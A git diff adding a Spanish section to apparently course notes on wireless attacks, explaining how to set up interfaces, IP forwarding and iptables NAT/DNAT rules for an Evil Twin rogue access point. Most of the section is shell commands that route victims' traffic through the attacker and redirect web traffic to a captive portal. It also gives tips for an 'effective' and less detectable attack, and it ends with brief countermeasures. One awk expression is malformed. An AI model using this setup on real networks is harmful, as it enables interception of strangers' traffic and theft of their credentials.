@@ -1579,3 +1579,76 @@ airbase-ng -e "NombreRedOriginal" -c 6 -a 00:11:22:33:44:55 wlan0mon
 - La estabilidad del punto de acceso falso es crucial para mantener las conexiones de las víctimas
 - El hardware utilizado debe tener buena compatibilidad con el modo monitor y la inyección de paquetes
 
+
+## 48. EvilTwin - Definición de reglas con iptables y creación de interfaces de red
+
+Este video explica cómo configurar las reglas de firewall con iptables y gestionar las interfaces de red para dirigir correctamente el tráfico en un ataque Evil Twin, asegurando que las víctimas puedan navegar mientras sus datos son interceptados.
+
+### Fundamento técnico:
+- Iptables es la herramienta de firewall en Linux que permite controlar el tráfico de red
+- En un ataque Evil Twin, se necesita configurar el enrutamiento y NAT para que las víctimas tengan acceso a internet
+- La correcta configuración de interfaces permite separar el tráfico de ataque del tráfico legítimo
+- Las reglas de firewall pueden redirigir selectivamente cierto tráfico (como HTTP/HTTPS) a herramientas de interceptación
+
+### Procedimiento teniendo en cuenta el documento DHCP:
+
+#### 1. Configuración de interfaces
+```bash
+ifconfig at0 [optionRouters] netmask [netmask] # Asigna una IP y máscara a la interfaz virtual `at0` (AP falso creado con `airbase-ng`).
+
+route add -net [subnet] netmask [optionSubnetMask] gw [optionRouters] # Añade una ruta para que el tráfico hacia la subred de la red falsa pase por `at0`
+```
+
+#### 2. Habilitar el reenvío de paquetes
+```bash
+echo 1 > /proc/sys/net/ipv4/ip_forward # Activa el reenvío de paquetes IPv4 para permitir que el tráfico pase entre interfaces (como `at0` y `eth0`)
+
+# Configuración permanente de ip forwarding
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+sysctl -p
+```
+
+#### 3. Configuración básica de iptables para NAT
+```bash
+iptables --flush # Elimina todas las reglas actuales de todas las cadenas en la tabla
+
+iptables --table nat --flush # Elimina todas las reglas de la tabla nat
+
+iptables --table nat --delete-chain # Elimina cualquier cadena personalizada en la tabla nat (si existen)
+
+# Configurar NAT para permitir acceso a internet
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE # Enmascara las IPs de los clientes de la red falsa al salir por `eth0`
+
+iptables --append FORWARD --in-interface at0 -o eth0 -j ACCEPT # Permite reenviar tráfico desde los clientes conectados a `at0` hacia Internet (`eth0`)
+
+iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Permite respuestas del tráfico de Internet solo si fueron solicitadas por los clientes conectados a `at0`
+```
+
+#### 4. Redirección de tráfico web al portal cautivo
+```bash
+# Redirigir todo el tráfico HTTP al portal cautivo
+iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '[print $1}'):80
+
+# Redirigir intentos de HTTPS (más difícil de interceptar completamente)
+iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination $(hostname -I | awk '[print $1}'):443
+
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #Aplica NAT dinámico (mascaramiento) a odo el tráfico saliente por la interfaz
+```
+
+#### Control de ancho de banda
+```bash
+# Limitar velocidad para hacer el ataque menos detectable
+iptables -A FORWARD -i at0 -o eth0 -m limit --limit 1000/s -j ACCEPT
+```
+
+### Mejores prácticas para un ataque efectivo:
+- Implementar reglas que permitan todo el tráfico por defecto y solo intercepten lo necesario
+- Configurar timeouts adecuados para mantener las conexiones activas
+- Utilizar logging moderado para no saturar el sistema con entradas de registro
+- Preparar scripts para restaurar la configuración original en caso de problemas
+
+### Contramedidas:
+- Utilizar VPNs que cifren todo el tráfico de red
+- Implementar HSTS (HTTP Strict Transport Security) en sitios web
+- Configurar DNS sobre HTTPS (DoH) o DNS sobre TLS (DoT)
+- Utilizar herramientas de detección de ARP spoofing y manipulación de DNS
